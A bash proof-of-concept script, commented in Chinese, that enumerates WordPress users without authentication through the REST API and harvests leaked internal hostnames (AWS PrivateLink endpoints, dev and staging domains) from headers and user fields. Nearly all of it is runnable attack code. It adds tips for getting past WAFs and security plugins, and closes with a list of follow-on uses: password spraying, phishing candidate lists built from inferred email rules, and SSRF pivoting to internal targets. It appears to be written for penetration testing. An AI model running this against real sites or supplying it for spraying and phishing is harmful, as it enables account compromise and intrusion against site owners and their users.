#!/usr/bin/env bash
# WordPress REST 未认证用户枚举 + 内部拓扑泄露（Link 头 / user.url）
# 适用: WordPress 站点（含子目录部署，如 /blog），users 路由未被安全插件关闭
# 前置: 只要能匿名 HTTPS 访问站点；无需 Cookie / Token / 登录；建议浏览器 UA
# 用法: BLOG='https://host/blog' bash poc.sh
#       export HTTPS_PROXY=http://127.0.0.1:7892      # 需要走记录代理时（命令级，勿改系统网络）
# 落盘: /tmp/wp_home.html /tmp/wp_users.json /tmp/wp_users_asc.json /tmp/wp_json_hdr.txt /tmp/wp_user1.json
#
# 判据（三条同时成立才算命中）:
#   1) GET {BLOG}/wp-json/wp/v2/users?per_page=100 -> 200 + JSON 数组（>=1 个用户对象）
#   2) 同站 wp/v2/settings|themes|plugins -> 401/403（阴性对照：不是整体鉴权缺失）
#   3) 下列任一内部标识出现在响应中:
#        a. /wp-json/ 响应头 Link: <http://vpce-...vpce-svc-....vpce.amazonaws.com/wp-json/>; rel="https://api.w.org/"
#        b. 用户对象的 url/link 字段指向 dev./staging./内网域名 或 *.vpce.amazonaws.com
#
# 定性口径:
#   vpce 主机公网 NXDOMAIN（仅 VPC 内可达）= 纯信息泄露（内部拓扑 / 供应链），不是入口；
#   若可解析，才补 443/80 连通性测试，并考虑升级为内网访问面。
#   注意：本脚本只做只读枚举，不做口令爆破。

set -u
B="${BLOG:?用法: BLOG=https://<host>/<wp-subdir> bash poc.sh}"
B="${B%/}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36}"
CURL=(curl -sk --max-time 25 -A "$UA")

hr(){ printf '\n== %s ==\n' "$*"; }

hr "0) 指纹（版本 / 主题）"
"${CURL[@]}" "$B/" -o /tmp/wp_home.html -w 'GET / |%{http_code} %{size_download}\n' || exit 1
grep -oiE '<meta name="generator" content="[^"]+"' /tmp/wp_home.html | head -3
grep -oiE 'wp-content/themes/[a-z0-9._-]+' /tmp/wp_home.html | sort -u | head -5
# generator 可能被安全插件删掉；以 /wp-json/ 路由表 + 静态资源版本为准

hr "1) 阴性对照（受保护路由）"
for p in settings themes plugins; do
  printf '%-14s ' "wp/v2/$p"
  "${CURL[@]}" -o /dev/null -w '%{http_code} %{size_download}\n' "$B/wp-json/wp/v2/$p"
done
# 期望 401（或 403）。若这里也 200，说明整站鉴权缺失，本条降级为背景信息。

hr "2) 主判据：用户全量枚举"
"${CURL[@]}" "$B/wp-json/wp/v2/users?per_page=100" -o /tmp/wp_users.json \
  -w 'users     |%{http_code} %{size_download} %{content_type}\n'
"${CURL[@]}" "$B/wp-json/wp/v2/users?per_page=100&orderby=id&order=asc" -o /tmp/wp_users_asc.json \
  -w 'users_asc |%{http_code} %{size_download}\n'

python3 - <<'PY'
import json
def load(p):
    try:
        return json.load(open(p))
    except Exception as e:
        print("  [!] %s 非 JSON（WAF/安全插件拦截或路由关闭）: %s" % (p, e))
        return None
d = load('/tmp/wp_users.json')
if isinstance(d, list):
    print("  账号数 =", len(d), " ids =", [u.get('id') for u in d])
    print("  字段 =", sorted(d[0].keys()) if d else [])
    for u in d[:5]:
        print("   -", u.get('id'), u.get('slug'), '|', u.get('name'))
    if any(('acf' in u) or ('yoast_head_json' in u) for u in d):
        print("  [+] 用户对象带主题/SEO 自定义字段(acf/yoast_head_json)：数据面比默认 WP 更宽")
    # slug 由企业邮箱变形（如 name<domain>）时可反推邮箱命名规则，用于授权范围内的凭据强度验证
else:
    print("  [!] 非数组响应，可能是 rest_no_route / 401 包装对象:", str(d)[:200])
a = load('/tmp/wp_users_asc.json')
if isinstance(a, list):
    print("  升序 ids =", [u.get('id') for u in a], "（与上一行集合一致 = 全量，非分页截断）")
PY

hr "3) 内部拓扑泄露：/wp-json/ 的 Link 头"
"${CURL[@]}" -D /tmp/wp_json_hdr.txt -o /dev/null "$B/wp-json/"
grep -iE '^(link|server|via|x-cache|x-served-by):' /tmp/wp_json_hdr.txt
VPC=$(grep -oiE 'vpce-[0-9a-z-]+\.vpce-svc-[0-9a-z-]+\.[a-z0-9-]+\.vpce\.amazonaws\.com' /tmp/wp_json_hdr.txt | head -1)
[ -n "${VPC:-}" ] && echo "  [+] Link 头泄露 AWS PrivateLink 端点: $VPC"

hr "4) 内部拓扑泄露：用户对象 url / link 字段"
"${CURL[@]}" "$B/wp-json/wp/v2/users/1" -o /tmp/wp_user1.json -w 'user/1    |%{http_code} %{size_download}\n'
python3 - <<'PY'
import json, re
try:
    u = json.load(open('/tmp/wp_user1.json'))
except Exception as e:
    print("  [!] 非 JSON:", e); raise SystemExit
pat = re.compile(r'(vpce-[0-9a-z-]+\.vpce-svc-[0-9a-z-]+\.|amazonaws\.com|//(dev|staging|test|internal|intranet)\.)', re.I)
for k in ('url', 'link'):
    v = u.get(k) or ''
    if v:
        print("  %-4s = %s" % (k, v))
        if pat.search(v):
            print("  [+] %s 指向内部/开发环境域名" % k)
PY

hr "5) 定性：泄露 vs 入口"
if [ -n "${VPC:-}" ]; then
  if python3 -c "import socket,sys; socket.setdefaulttimeout(5); sys.exit(0 if socket.gethostbyname('$VPC') else 1)" 2>/dev/null; then
    echo "  [!] $VPC 公网可解析 -> 补测 443/80 连通性，可能升级为内网访问面"
  else
    echo "  [+] $VPC 公网 NXDOMAIN（仅 VPC 内可达）-> 纯信息泄露，不是入口"
  fi
else
  echo "  [-] 本次未捕获 vpce 主机名（Link 头可能被前置代理/CDN 重写）"
fi

hr "6) 边界对照（确认是路由级放开，不是登录面全开）"
for p in wp-login.php xmlrpc.php; do
  printf '%-14s ' "$p"
  "${CURL[@]}" -o /dev/null -w '%{http_code} %{size_download}\n' "$B/$p"
done
# 常见: 403 + 0 字节（源站 nginx/WAF 直接拦）。不影响 users 路由的结论。

cat <<'TIPS'

=== 失败时的常见原因 ===
1) 401/403 + JSON {"code":"rest_...","message":"..."}
   -> 安全插件（Wordfence / iThemes / 会员插件）全局禁用 REST 或 users 路由。
   用 GET /wp-json/ 的路由表确认 wp/v2/users 是否仍在。
2) 200 但空数组 -> 站点无公开作者，或插件把 users 过滤空；
   用 /wp-json/wp/v2/posts?per_page=1 的 author 字段交叉验证。
3) 404 rest_no_route -> REST 被改写/关闭；
   改走 /?author=N 的 301 差分，或 posts 里的 author id 反查。
4) 一直 403 text/html -> CDN/WAF 拦 UA；换浏览器 UA、单线程 >=2s，必要时走记录代理。
5) per_page 被限到 10 -> 加 &page=1..N 翻页；比较返回条数确认是否被重写。
6) Link 头没有 vpce 主机 -> 前置 CDN 重写了 Link；
   改用 /wp-json/wp/v2/users/1（或任意 id）的 link/url 字段取同类信息。

=== 这条泄露能干什么（均需授权范围内） ===
- 用户名/作者 slug 全量清单 -> 口令强度验证、密码喷洒、社工画像；
- slug 含企业域名变形 -> 推断邮箱命名规则，生成定向凭据验证/钓鱼候选集；
- vpce 端点 = 该 WP 的真实集群内入口，可与 SSRF/代理类漏洞组合作为内网目标；
- 外包商 dev 域名 -> 供应链侧资产测绘入口（注意范围边界，勿越界打第三方）。
TIPS